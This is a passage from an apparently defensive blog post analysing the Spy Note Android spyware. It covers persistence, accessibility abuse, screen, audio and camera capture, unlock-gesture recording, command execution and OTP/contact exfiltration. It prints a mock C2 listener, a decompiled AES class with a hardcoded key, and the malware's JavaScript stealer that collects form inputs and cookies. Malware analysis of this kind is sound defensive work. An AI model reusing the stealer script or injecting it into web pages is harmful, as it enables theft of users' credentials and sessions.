<span class="n">server</span> <span class="o">=</span> <span class="n">ThreadedTCPServer</span><span class="p">((</span><span class="s">"0.0.0.0"</span><span class="p">,</span> <span class="mi">7771</span><span class="p">),</span> <span class="n">MyTCPHandler</span><span class="p">)</span>
<span class="n">server_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">server</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">)</span>
<span class="n">server_thread</span><span class="p">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
<span class="n">server_thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
<span class="n">server</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span></code></pre>
              </figure>

              <p>
                The spyware seems to track the applications a user opens and
                sends this information to the C2 server.
              </p>

              <figure class="highlight">
                <pre><code class="language-cmd" data-lang="cmd">$ C:/Python310/python.exe ./server.py
b'-AGoogle Play Store'
b'-ASystem UI'
b'-ASettings'
b'-ASystem UI'
b'-AChrome'
b'-ASystem UI'
b'-ASamsung Notes'
b'-A'
b'-AGallery'
b'-A'
b'-ASystem UI'
b'-A'
b'-AContacts'
b'-A'</code></pre>
              </figure>

              <p>
                It also includes a recording and logging feature to track the
                user’s activity and store it encrypted in the
                <code class="language-plaintext highlighter-rouge"
                  >/Config/sys/apps/log</code
                >
                directory. The encryption utility class was found with a key
                that uses plain
                <code class="language-plaintext highlighter-rouge"
                  >AES/ECB</code
                >
                algorithm.
              </p>

              <figure class="highlight">
                <pre><code class="language-java" data-lang="java"><span class="cm">/* renamed from: rick.ima.vlhoudgqvelssaagghdkwlnbxhydmfrogwrkedxwibafeicgfc2.xeieqyfbodhpjcnnvuvrmzmibanduvsmuqzasbvlzbblxyfefu4.Encryptionngmnirovqjnqgajxajbdwddatjoeofelxjqmvstbqnbjrbxkhs9Utils */</span>
<span class="cm">/* loaded from: classes.dex */</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">EncryptionUtils</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">AES_ALGORITHM</span> <span class="o">=</span> <span class="s">"AES"</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">SECRET_KEY</span> <span class="o">=</span> <span class="s">"93b89a273c1fbe59073af7bd9adfa6c0"</span><span class="o">;</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">encrypt</span><span class="o">(</span><span class="nc">String</span> <span class="n">str</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">SecretKeySpec</span> <span class="n">secretKeySpec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SecretKeySpec</span><span class="o">(</span><span class="no">SECRET_KEY</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="no">AES_ALGORITHM</span><span class="o">);</span>
        <span class="nc">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="nc">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="no">AES_ALGORITHM</span><span class="o">);</span>
        <span class="n">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">secretKeySpec</span><span class="o">);</span>
        <span class="k">return</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">str</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()),</span> <span class="mi">0</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">decrypt</span><span class="o">(</span><span class="nc">String</span> <span class="n">str</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">SecretKeySpec</span> <span class="n">secretKeySpec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SecretKeySpec</span><span class="o">(</span><span class="no">SECRET_KEY</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="no">AES_ALGORITHM</span><span class="o">);</span>
        <span class="nc">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="nc">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="no">AES_ALGORITHM</span><span class="o">);</span>
        <span class="n">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">secretKeySpec</span><span class="o">);</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="nc">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">str</span><span class="o">,</span> <span class="mi">0</span><span class="o">)));</span>
    <span class="o">}</span>
<span class="o">}</span></code></pre>
              </figure>

              <h3 id="persistance">Persistance</h3>

              <p>
                In addition to the
                <code class="language-plaintext highlighter-rouge"
                  >uncaughtExceptionHandler</code
                >
                callback, the spyware persist itself by controling the uninstall
                cancel button whenever you try to uninstall it via UI. The only
                way to uninstall it is via
                <code class="language-plaintext highlighter-rouge"
                  >adb uninstall</code
                >
                command though.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/11-1159256854ff57d640fe8f774648bf9dfb16d0e197378acc9a96d21644fd566f.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/11-1159256854ff57d640fe8f774648bf9dfb16d0e197378acc9a96d21644fd566f.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/11-1159256854ff57d640fe8f774648bf9dfb16d0e197378acc9a96d21644fd566f.png"
                    data-zooming-width="709"
                    data-zooming-height="285"
                  />
                </a>
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/12-cb3775251fd7cf23796b830ff91e7b0674516cb7b8a838d511380c7f7f65f500.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/12-cb3775251fd7cf23796b830ff91e7b0674516cb7b8a838d511380c7f7f65f500.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/12-cb3775251fd7cf23796b830ff91e7b0674516cb7b8a838d511380c7f7f65f500.png"
                    data-zooming-width="1000"
                    data-zooming-height="210"
                  />
                </a>
              </p>

              <p>
                It also requests auto start permissions in order to continue
                running even after the device is rebooted.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/17-3b02503e49f5df965990362ee26a7f985e9ea362e72998dfe01a47391618f84c.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/17-3b02503e49f5df965990362ee26a7f985e9ea362e72998dfe01a47391618f84c.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/17-3b02503e49f5df965990362ee26a7f985e9ea362e72998dfe01a47391618f84c.png"
                    data-zooming-width="1325"
                    data-zooming-height="221"
                  />
                </a>
              </p>

              <h3 id="device-full-control">Device Full Control</h3>

              <p>
                The Spy Note extends a full
                <code class="language-plaintext highlighter-rouge"
                  >AccessibilityService</code
                >
                class that will do anything on the user’s device that includs:
              </p>
              <ul>
                <li>Monitoring UI interactions.</li>
                <li>Manipulate device security settings.</li>
                <li>Perform device’s custom actions.</li>
                <li>Capture visited URLs and screen gestures.</li>
                <li>Request device’s administrator.</li>
              </ul>

              <p>
                In Adnroid,
                <code class="language-plaintext highlighter-rouge"
                  >AccessibilityService</code
                >
                is a special service designed to help apps interact with the
                user interface in ways that are useful for accessibility
                purposes, such as for users with disabilities. Threat actors and
                malware authors abuse these features to control the user’s
                device rather in just few lines of code.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/15-517c766db18dfd036876727ac7b26973d2d938bb39e933c86fe603278a806e0b.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/15-517c766db18dfd036876727ac7b26973d2d938bb39e933c86fe603278a806e0b.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/15-517c766db18dfd036876727ac7b26973d2d938bb39e933c86fe603278a806e0b.png"
                    data-zooming-width="1202"
                    data-zooming-height="143"
                  />
                </a>
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/16-aeeed9b35cff0e05c61b44a0b4679c606c9a7b5c81cea55be9a9f935e1939e32.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/16-aeeed9b35cff0e05c61b44a0b4679c606c9a7b5c81cea55be9a9f935e1939e32.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/16-aeeed9b35cff0e05c61b44a0b4679c606c9a7b5c81cea55be9a9f935e1939e32.png"
                    data-zooming-width="1404"
                    data-zooming-height="321"
                  />
                </a>
              </p>

              <p>
                It also has controlling capabilities for each device
                manefacturer (Xiaomi, Oppo, Samsung, etc.) as seen below.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/13-33847c67abde1c6d77d4662b9ef4f97c68e7f8fd383910d82f28c39f290fb636.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/13-33847c67abde1c6d77d4662b9ef4f97c68e7f8fd383910d82f28c39f290fb636.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/13-33847c67abde1c6d77d4662b9ef4f97c68e7f8fd383910d82f28c39f290fb636.png"
                    data-zooming-width="661"
                    data-zooming-height="179"
                  />
                </a>
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/14-e97a546764279e2bc47e410e2e3f3068b33e2ec1b23f313418bc9d8aa11d3fa7.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/14-e97a546764279e2bc47e410e2e3f3068b33e2ec1b23f313418bc9d8aa11d3fa7.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/14-e97a546764279e2bc47e410e2e3f3068b33e2ec1b23f313418bc9d8aa11d3fa7.png"
                    data-zooming-width="707"
                    data-zooming-height="172"
                  />
                </a>
              </p>

              <h3 id="screen-capture">Screen Capture</h3>

              <p>
                One of the main services are used to capture screenshots and
                send it to the C2 server. The images below shows the scrennshot
                was stored in an
                <code class="language-plaintext highlighter-rouge"
                  >ArrayList</code
                >
                and the items was added in it as
                <code class="language-plaintext highlighter-rouge">Bitmap</code>
                via another
                <code class="language-plaintext highlighter-rouge"
                  >ImageReader.OnImageAvailableListener</code
                >
                class.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/19-c03094536a106af604b3815d2584c5991a28bad4b60bd68d5cbe9bd16f95b16f.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/19-c03094536a106af604b3815d2584c5991a28bad4b60bd68d5cbe9bd16f95b16f.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/19-c03094536a106af604b3815d2584c5991a28bad4b60bd68d5cbe9bd16f95b16f.png"
                    data-zooming-width="1180"
                    data-zooming-height="212"
                  />
                </a>
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/18-be679847ebe68340a53a8ee0e04e4406ab8364b4b9a6ad351239d5b82e9143ab.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/18-be679847ebe68340a53a8ee0e04e4406ab8364b4b9a6ad351239d5b82e9143ab.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/18-be679847ebe68340a53a8ee0e04e4406ab8364b4b9a6ad351239d5b82e9143ab.png"
                    data-zooming-width="1782"
                    data-zooming-height="500"
                  />
                </a>
              </p>

              <p>
                Another background service was used to record conversations via
                device’s microphone and it has been used in
                <code class="language-plaintext highlighter-rouge"
                  >MainConnectionService</code
                >
                and saves the audio files in the external storage directory
                <code class="language-plaintext highlighter-rouge"
                  >/Config/sys/apps/rc/</code
                >.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/20-2db2625651fc0ae432f1ee3a318684ea9df984a41832e446d8baf07d35604124.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/20-2db2625651fc0ae432f1ee3a318684ea9df984a41832e446d8baf07d35604124.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/20-2db2625651fc0ae432f1ee3a318684ea9df984a41832e446d8baf07d35604124.png"
                    data-zooming-width="662"
                    data-zooming-height="255"
                  />
                </a>
              </p>

              <h3 id="device-unlock">Device Unlock</h3>

              <p>
                After some time digging into what the spyware can also do, I
                found another trick that unlocks the devices whenever the user
                leaves it. It records the screen gestures click positions when
                the user trying to unlock the device and save it in
                <code class="language-plaintext highlighter-rouge"
                  >/Config/sys/apps/tch/UNLOCK.json</code
                >
                file. Then, it loads the points again to unlock the device.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/21-ff8347c7614404b86a45e9af1c2ab73b3618d76de949825a5e0f2bc8c91a1cc2.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/21-ff8347c7614404b86a45e9af1c2ab73b3618d76de949825a5e0f2bc8c91a1cc2.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/21-ff8347c7614404b86a45e9af1c2ab73b3618d76de949825a5e0f2bc8c91a1cc2.png"
                    data-zooming-width="921"
                    data-zooming-height="455"
                  />
                </a>
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/22-cb5da20b22b2035fe65222ab154464bc36988ffc717862cc132266fb142a7962.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/22-cb5da20b22b2035fe65222ab154464bc36988ffc717862cc132266fb142a7962.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/22-cb5da20b22b2035fe65222ab154464bc36988ffc717862cc132266fb142a7962.png"
                    data-zooming-width="1166"
                    data-zooming-height="427"
                  />
                </a>
              </p>

              <p>
                Here’s the
                <code class="language-plaintext highlighter-rouge"
                  >UNLOCK.json</code
                >
                files that was found during the analysis. It turns out, it
                captured the points when I tried to enter the password wrong
                multiple times and the last 5 ponts was the correct ones after
                simulating it on the emulator.
              </p>

              <figure class="highlight">
                <pre><code class="language-cmd" data-lang="cmd">$ cat /mnt/sdcard/Config/sys/apps/tch/UNLOCK.json
{"C0":[{"x":213,"y":957}],"C1":[{"x":731,"y":960}],"C2":[{"x":261,"y":1085}],"C3":[{"x":245,"y":902}],"C4":[{"x":245,"y":902}],"C5":[{"x":780,"y":795}],"C6":[{"x":780,"y":795}],"C7":[{"x":780,"y":795}],"C8":[{"x":258,"y":957}],"C9":[{"x":398,"y":946}],"C10":[{"x":712,"y":982}],"C11":[{"x":239,"y":1067}],"C12":[{"x":687,"y":1449}]}</code></pre>
              </figure>

              <blockquote>
                <p>
                  Note that, the screen view is starting from the top left
                  corner of the display.
                </p>
              </blockquote>

              <h3 id="camera-and-video-capture">Camera and Video Capture</h3>

              <p>
                One more service is used to capture live video from the device’s
                camera and then save the video frames for later use. When an
                Android application requests to use the camera to capture images
                or videos, it displays them on a
                <code class="language-plaintext highlighter-rouge"
                  >SurfaceView</code
                >. This is the typical usage of the
                <code class="language-plaintext highlighter-rouge"
                  >SurfaceHolder</code
                >
                class, as seen in the image below.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/23-af78bb7e6d38deb1dff3ad5a74f798496c451d2e4c37640a7bee792d9cf1acd1.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/23-af78bb7e6d38deb1dff3ad5a74f798496c451d2e4c37640a7bee792d9cf1acd1.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/23-af78bb7e6d38deb1dff3ad5a74f798496c451d2e4c37640a7bee792d9cf1acd1.png"
                    data-zooming-width="1067"
                    data-zooming-height="588"
                  />
                </a>
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/24-f06743f250188bd89ee798e07c59d602cc21445bccf6e5b55d88b3e3aa3fb2b2.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/24-f06743f250188bd89ee798e07c59d602cc21445bccf6e5b55d88b3e3aa3fb2b2.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/24-f06743f250188bd89ee798e07c59d602cc21445bccf6e5b55d88b3e3aa3fb2b2.png"
                    data-zooming-width="1274"
                    data-zooming-height="335"
                  />
                </a>
              </p>

              <h3 id="stealing-users-credentials">
                Stealing User’s Credentials
              </h3>

              <p>
                Further analysis shows that the spyware is awaiting special
                commands from the C2 server. Most commands are found in a hidden
                background service function. One of these commands starts with
                <code class="language-plaintext highlighter-rouge"
                  >lnk&lt;*&gt;</code
                >; if so, it is followed by a link to open via a crafted
                <code class="language-plaintext highlighter-rouge"
                  >WebView</code
                >
                Activity that inserts malicious js code on the fly and steals
                any inputs the user enters, along with their cookies. After
                that, the collected data, along with the visited link, will be
                saved into a file in the
                <code class="language-plaintext highlighter-rouge"
                  >/Config/sys/apps/Data</code
                >
                directory.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/25-5a34253dd7a272f3e70ba39db01644f580c674adc58a17186e5a3240392af84d.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/25-5a34253dd7a272f3e70ba39db01644f580c674adc58a17186e5a3240392af84d.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/25-5a34253dd7a272f3e70ba39db01644f580c674adc58a17186e5a3240392af84d.png"
                    data-zooming-width="998"
                    data-zooming-height="247"
                  />
                </a>
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/26-19adb202119d194c26b8c21469811f8163bc83a4f4e162339dceb8697c450c35.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/26-19adb202119d194c26b8c21469811f8163bc83a4f4e162339dceb8697c450c35.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/26-19adb202119d194c26b8c21469811f8163bc83a4f4e162339dceb8697c450c35.png"
                    data-zooming-width="921"
                    data-zooming-height="489"
                  />
                </a>
              </p>

              <p>Here’s the formatted stealer script below.</p>

              <figure class="highlight">
                <pre><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">frame</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="nx">g</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">frame</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">frame</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">frame</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">none</span><span class="dl">'</span><span class="p">;</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">frame</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nx">console</span> <span class="o">=</span> <span class="nx">frame</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">console</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">inputs</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">websiteLink</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">alltext</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
    <span class="nx">inputs</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">input</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">type</span> <span class="o">=</span> <span class="nx">input</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">type</span><span class="dl">'</span><span class="p">);</span>
        <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">input</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">value</span> <span class="o">!==</span> <span class="dl">""</span> <span class="o">&amp;&amp;</span> <span class="nx">value</span> <span class="o">!==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="nx">type</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span> <span class="o">&amp;&amp;</span> <span class="nx">type</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">checkbox</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">alltext</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">type</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">]: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">value</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">~</span><span class="dl">"</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">[Cookie]:</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">~</span><span class="dl">"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="nx">alltext</span><span class="p">;</span>
<span class="p">};</span>
<span class="nx">g</span><span class="p">();</span></code></pre>
              </figure>

              <h3 id="command-execution">Command Execution</h3>

              <p>
                In addition to the functionalities described above, Spy Note can
                also execute commands sent by the C2 on the affected device and
                then send the results back to the C2 server.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/28-4a958c70e5ac27e504054631f428059f9fcc02e12ed22954747304b4b910331e.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/28-4a958c70e5ac27e504054631f428059f9fcc02e12ed22954747304b4b910331e.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/28-4a958c70e5ac27e504054631f428059f9fcc02e12ed22954747304b4b910331e.png"
                    data-zooming-width="976"
                    data-zooming-height="500"
                  />
                </a>
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/29-0afd149c85ed4bcee173b2d145a60c673a8d29b097a40efb4bcbd5a5b63c7dca.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/29-0afd149c85ed4bcee173b2d145a60c673a8d29b097a40efb4bcbd5a5b63c7dca.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/29-0afd149c85ed4bcee173b2d145a60c673a8d29b097a40efb4bcbd5a5b63c7dca.png"
                    data-zooming-width="1214"
                    data-zooming-height="353"
                  />
                </a>
              </p>

              <h3 id="otp-and-contacts-exfiltration">
                OTP and Contacts Exfiltration
              </h3>

              <p>
                The Spy Note also requests the
                <code class="language-plaintext highlighter-rouge"
                  >android.permission.READ_SMS</code
                >
                permission, even though there is no indication of it collecting
                SMS messages from the user’s device in this version. Instead, it
                was found listening for any verification SMS sent to the device
                via the
                <code class="language-plaintext highlighter-rouge"
                  >SmsRetriever</code
                >
                API. This API is part of Google’s Play services and is used to
                retrieve authentication-based SMS (such as in the case of a
                OTP).
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/30-981166803d79e8f42fdc69e20dfc48b52715a7c6f8356b107e2ee43133bde3d3.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/30-981166803d79e8f42fdc69e20dfc48b52715a7c6f8356b107e2ee43133bde3d3.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/30-981166803d79e8f42fdc69e20dfc48b52715a7c6f8356b107e2ee43133bde3d3.png"
                    data-zooming-width="1372"
                    data-zooming-height="231"
                  />
                </a>
              </p>

              <p>
                Besides the OTP retriever capability, it also exfiltrates all
                the contacts stored on the device and send it one by one via SMS
                to a specific phone number sent by the C2 server.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/27-b11bf0490591ae8d92089e7eb2e74ec9e9ee8fabeb02519b1bd5257d5d5c8745.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/27-b11bf0490591ae8d92089e7eb2e74ec9e9ee8fabeb02519b1bd5257d5d5c8745.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/27-b11bf0490591ae8d92089e7eb2e74ec9e9ee8fabeb02519b1bd5257d5d5c8745.png"
                    data-zooming-width="1324"
                    data-zooming-height="440"
                  />
                </a>
              </p>

              <p><a id="conc"></a></p>

              <h2 id="conclusion">Conclusion</h2>

              <p>
                There are other unmentioned functionalities, such as maintaining
                Wi-Fi connections when the device is idle and creating Wi-Fi
                Peer-to-Peer (Wi-Fi Direct) communication, which allows devices
                to interact with each other without needing an access point
                (router). Spy Note: With all these capabilities, it functions
                somewhat like a Remote Access Tool (RAT). It also has different
                variants that will continue to spread, and threat actors will
                keep using it to collect critical user data. As a normal user,
                you should avoid installing games or applications from unknown
                sources, other than legitimate app stores like Google Play.
              </p>
            </div>
            <div class="article-share">
              <a
                href="https://twitter.com/home?status=Spy+Note+Android+Malware+Analysis%20-%20https://s4yed.github.io/posts/spy-note-android-malware-analysis"
                title="Share on Twitter"
                rel="noreferrer noopener"
                target="_blank"
              >
                <svg viewBox="0 0 512 512">
                  <path
                    d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"
                  />
                </svg>
              </a>
              <a
                href="https://www.facebook.com/sharer/sharer.php?u=https://s4yed.github.io/posts/spy-note-android-malware-analysis"
                title="Share on Facebook"
                rel="noreferrer noopener"
                target="_blank"
              >
                <svg viewBox="0 0 512 512">
                  <path
                    d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"
                  />
                </svg>
              </a>
            </div>

            <div id="disqus_thread" class="article-comments"></div>
            <script
              src="https://my-blog-0vgcdsd8x2.disqus.com/embed.js"
              async
              defer
            ></script>
            <noscript>Please enable JavaScript to view the comments.</noscript>
          </article>
          <footer class="footer scrollappear">
            <p style="text-align: center">
              My little tech blog &#169; 2025
              <!-- <a href="/about" title="About me">Ahmed Sayed</a> -->
            </p>
          </footer>
        </div>
      </div>
    </main>

    <script
      async
      src="https://www.googletagmanager.com/gtag/js?id=UA-157807027-1"
    ></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag() {
        dataLayer.push(arguments);
      }
      gtag("js", new Date());
      gtag("config", "UA-157807027-1");
    </script>

    <script
      src="/assets/vendor-3ee2c63bbac916f96cd7f90e83ab767f058ead1301444c9966f5156911c8be7f.js"
      type="text/javascript"
    ></script>

    <script
      src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"
      type="text/javascript"
    ></script>

    <script
      src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"
      type="text/javascript"
    ></script>

    <script
      src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"
      type="text/javascript"
    ></script>

    <script
      src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"
      type="text/javascript"
    ></script>

    <script
      src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"
      type="text/javascript"
    ></script>
  </body>
</html>
